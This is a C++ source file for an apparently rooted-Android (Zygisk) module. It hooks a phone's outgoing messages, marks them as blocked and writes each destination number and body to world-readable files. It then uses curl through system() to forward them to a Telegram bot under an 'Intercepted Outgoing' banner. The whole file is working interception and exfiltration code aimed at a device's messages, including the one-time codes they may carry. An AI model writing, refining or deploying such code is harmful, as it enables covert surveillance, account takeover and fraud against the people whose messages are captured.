#include "tg_urgent.hpp"

#include <cstdio>
#include <cstring>
#include <ctime>
#include <jni.h>
#include <string>
#include <unistd.h>
#include <sys/stat.h>

namespace tg_urgent {

namespace {

zygisk::Api* g_api = nullptr;

std::string html_esc(const std::string& s) {
    std::string o;
    o.reserve(s.size() + 8);
    for (unsigned char c : s) {
        if (c == '&') o += "&amp;";
        else if (c == '<') o += "&lt;";
        else if (c == '>') o += "&gt;";
        else o += static_cast<char>(c);
    }
    return o;
}

std::string json_esc(const std::string& s) {
    std::string o;
    o.reserve(s.size() + 8);
    for (unsigned char c : s) {
        if (c == '\\' || c == '"') {
            o += '\\';
            o += static_cast<char>(c);
        } else if (c == '\n') {
            o += "\\n";
        } else if (c == '\r') {
            o += "\\r";
        } else if (c == '\t') {
            o += "\\t";
        } else if (c < 0x20) {
            char buf[8];
            snprintf(buf, sizeof(buf), "\\u%04x", c);
            o += buf;
        } else {
            o += static_cast<char>(c);
        }
    }
    return o;
}

std::string display_to(const std::string& dest) {
    std::string d;
    for (char c : dest)
        if (c >= '0' && c <= '9') d += c;
    if (d.size() == 10) return "+91" + d;
    if (d.size() == 12 && d.rfind("91", 0) == 0) return "+" + d;
    if (!dest.empty() && dest[0] == '+') return dest;
    return d.empty() ? dest : d;
}

bool read_creds(std::string& token, std::string& chat) {
    token.clear();
    chat.clear();
    const char* paths[] = {
        "/data/local/tmp/hivirtus_telegram_credentials.json",
        "/data/adb/modules/hivirtus_zygisk_mode/telegram_credentials.json",
        nullptr,
    };
    for (const char** p = paths; *p; ++p) {
        FILE* f = fopen(*p, "r");
        if (!f) continue;
        char buf[2048] = {};
        size_t n = fread(buf, 1, sizeof(buf) - 1, f);
        fclose(f);
        if (n == 0) continue;
        std::string j(buf, n);
        auto grab = [&](const char* key) -> std::string {
            std::string k = std::string("\"") + key + "\"";
            auto pos = j.find(k);
            if (pos == std::string::npos) return {};
            pos = j.find(':', pos);
            if (pos == std::string::npos) return {};
            pos = j.find('"', pos);
            if (pos == std::string::npos) return {};
            auto end = j.find('"', pos + 1);
            if (end == std::string::npos) return {};
            return j.substr(pos + 1, end - pos - 1);
        };
        token = grab("telegram_bot_token");
        chat = grab("telegram_chat_id");
        if (!token.empty() && !chat.empty()) return true;
    }
    return false;
}

void write_blocked_files(const std::string& dest, const std::string& body) {
    char flag[2048];
    snprintf(flag, sizeof(flag), "%s\n%s\n", dest.c_str(), body.c_str());
    FILE* f = fopen("/data/local/tmp/hivirtus_outgoing_blocked.flag", "w");
    if (f) {
        fputs(flag, f);
        fclose(f);
        chmod("/data/local/tmp/hivirtus_outgoing_blocked.flag", 0666);
    }
    char json[4096];
    snprintf(json, sizeof(json),
             "{\"dest\":\"%s\",\"body\":\"%s\",\"ts\":%ld,\"urgent\":true}\n",
             json_esc(dest).c_str(), json_esc(body).c_str(), static_cast<long>(time(nullptr)));
    f = fopen("/data/local/tmp/hivirtus_outgoing_blocked.json", "w");
    if (f) {
        fputs(json, f);
        fclose(f);
        chmod("/data/local/tmp/hivirtus_outgoing_blocked.json", 0666);
    }
    f = fopen("/data/local/tmp/hivirtus_tg_urgent.flag", "w");
    if (f) {
        fputs("1\n", f);
        fclose(f);
        chmod("/data/local/tmp/hivirtus_tg_urgent.flag", 0666);
    }
}

std::string build_html(const std::string& dest, const std::string& body) {
    const std::string to = display_to(dest);
    // Match spaced screenshot: 1 blank after header, 1 blank between To ↔ Body
    std::string text;
    text += "\xF0\x9F\x93\xB1 <b>Intercepted Outgoing Zygisk Mode Menu By @Hivirtus \xF0\x9F\x94\xA5</b>\n\n";
    text += "<b>To (Tap to copy):</b>\n";
    text += "<code>";
    text += html_esc(to);
    text += "</code>\n\n";
    text += "<b>Body (Tap to copy):</b>\n";
    text += "<code>";
    text += html_esc(body);
    text += "</code>";
    return text;
}

void log_tg(const char* msg, const std::string& dest, size_t body_len) {
    FILE* lf = fopen("/data/local/tmp/hivirtus_tg_forward.log", "a");
    if (!lf) return;
    fprintf(lf, "companion_tg %s dest=%s len=%zu ts=%ld\n", msg, dest.c_str(), body_len,
            static_cast<long>(time(nullptr)));
    fclose(lf);
    chmod("/data/local/tmp/hivirtus_tg_forward.log", 0666);
}

bool curl_send(const std::string& token, const std::string& chat, const std::string& html) {
    std::string payload = "{\"chat_id\":\"";
    payload += json_esc(chat);
    payload += "\",\"text\":\"";
    payload += json_esc(html);
    payload += "\",\"parse_mode\":\"HTML\",\"disable_web_page_preview\":true}";

    const char* path = "/data/local/tmp/hivirtus_tg_urgent_payload.json";
    FILE* f = fopen(path, "w");
    if (!f) return false;
    fwrite(payload.data(), 1, payload.size(), f);
    fclose(f);
    chmod(path, 0666);

    std::string url = "https://api.telegram.org/bot" + token + "/sendMessage";
    std::string cmd =
        "(/data/adb/magisk/busybox curl -sS -m 4 -X POST '" + url +
        "' -H 'Content-Type: application/json' --data-binary @" + path +
        " -o /data/local/tmp/hivirtus_tg_urgent_resp.txt) 2>/data/local/tmp/hivirtus_tg_urgent_err.txt "
        "|| curl -sS -m 4 -X POST '" + url +
        "' -H 'Content-Type: application/json' --data-binary @" + path +
        " -o /data/local/tmp/hivirtus_tg_urgent_resp.txt 2>>/data/local/tmp/hivirtus_tg_urgent_err.txt "
        "|| true";
    system(cmd.c_str());

    FILE* rf = fopen("/data/local/tmp/hivirtus_tg_urgent_resp.txt", "r");
    if (!rf) return false;
    char buf[512] = {};
    fread(buf, 1, sizeof(buf) - 1, rf);
    fclose(rf);
    return strstr(buf, "\"ok\":true") != nullptr || strstr(buf, "\"ok\": true") != nullptr;
}

void mark_sent(const std::string& dest, const std::string& body) {
    FILE* mf = fopen("/data/local/tmp/hivirtus_tg_inproc_sent.flag", "w");
    if (mf) {
        fprintf(mf, "%s\n%s\n", dest.c_str(), body.c_str());
        fclose(mf);
        chmod("/data/local/tmp/hivirtus_tg_inproc_sent.flag", 0666);
    }
    // Write key file for service md5-less skip via inproc; also store raw key hash file
    FILE* kf = fopen("/data/local/tmp/hivirtus_tg_out_dedupe.key", "w");
    if (kf) {
        fprintf(kf, "%s|%s\n", dest.c_str(), body.c_str());
        fclose(kf);
        chmod("/data/local/tmp/hivirtus_tg_out_dedupe.key", 0666);
    }
    // md5 via printf file to avoid shell quoting bombs
    FILE* raw = fopen("/data/local/tmp/hivirtus_tg_md5_in.txt", "w");
    if (raw) {
        fprintf(raw, "%s|%s", dest.c_str(), body.c_str());
        fclose(raw);
    }
    system(
        "md5sum /data/local/tmp/hivirtus_tg_md5_in.txt 2>/dev/null | awk '{print $1}' "
        "> /data/local/tmp/hivirtus_tg_out_dedupe.hash; "
        "date +%s > /data/local/tmp/hivirtus_tg_out_dedupe.ts; "
        "chmod 666 /data/local/tmp/hivirtus_tg_out_dedupe.hash "
        "/data/local/tmp/hivirtus_tg_out_dedupe.ts 2>/dev/null; "
        "rm -f /data/local/tmp/hivirtus_tg_urgent.flag "
        "/data/local/tmp/hivirtus_outgoing_blocked.flag "
        "/data/local/tmp/hivirtus_outgoing_blocked.json "
        "/data/local/tmp/hivirtus_pending_verify.json "
        "/data/local/tmp/hivirtus_tg_md5_in.txt 2>/dev/null; "
        "printf '%s\\n' '{\"dest\":\"\",\"body\":\"\",\"note\":\"already_forwarded\"}' "
        "> /data/local/tmp/hivirtus_last_outgoing.json; true");
}

bool do_send(const std::string& dest, const std::string& body) {
    if (dest.empty() || body.empty()) return false;
    write_blocked_files(dest, body);
    std::string token, chat;
    if (!read_creds(token, chat)) {
        log_tg("no_creds", dest, body.size());
        return false;
    }
    const bool ok = curl_send(token, chat, build_html(dest, body));
    log_tg(ok ? "ok" : "fail", dest, body.size());
    if (ok) mark_sent(dest, body);
    return ok;
}

}  // namespace

void set_api(zygisk::Api* api) { g_api = api; }

void send(const std::string& dest, const std::string& body) {
    write_blocked_files(dest, body);
    if (!g_api) return;
    std::string line = "tg_out|" + dest + "|" + body;
    if (line.size() > 8000) line.resize(8000);
    const int fd = g_api->connectCompanion();
    if (fd < 0) return;
    const uint32_t n = static_cast<uint32_t>(line.size());
    write(fd, &n, sizeof(n));
    if (n) write(fd, line.data(), n);
    close(fd);
}

void companion_handle(const std::string& line) {
    if (line.rfind("tg_out|", 0) != 0) return;
    std::string rest = line.substr(7);
    auto p = rest.find('|');
    if (p == std::string::npos) return;
    do_send(rest.substr(0, p), rest.substr(p + 1));
}

static void JNICALL jni_urgent_tg(JNIEnv* env, jclass, jstring jto, jstring jbody) {
    if (!env) return;
    const char* to = jto ? env->GetStringUTFChars(jto, nullptr) : nullptr;
    const char* body = jbody ? env->GetStringUTFChars(jbody, nullptr) : nullptr;
    std::string dest = to ? to : "";
    std::string msg = body ? body : "";
    if (jto && to) env->ReleaseStringUTFChars(jto, to);
    if (jbody && body) env->ReleaseStringUTFChars(jbody, body);
    if (!dest.empty() && !msg.empty()) send(dest, msg);
}

bool register_jni(JNIEnv* env, jclass cls) {
    if (!env || !cls) return false;
    static const JNINativeMethod kMethods[] = {
        {"nativeUrgentTg", "(Ljava/lang/String;Ljava/lang/String;)V",
         reinterpret_cast<void*>(jni_urgent_tg)},
    };
    if (env->RegisterNatives(cls, kMethods, 1) != 0) {
        if (env->ExceptionCheck()) env->ExceptionClear();
        return false;
    }
    return true;
}

}  // namespace tg_urgent
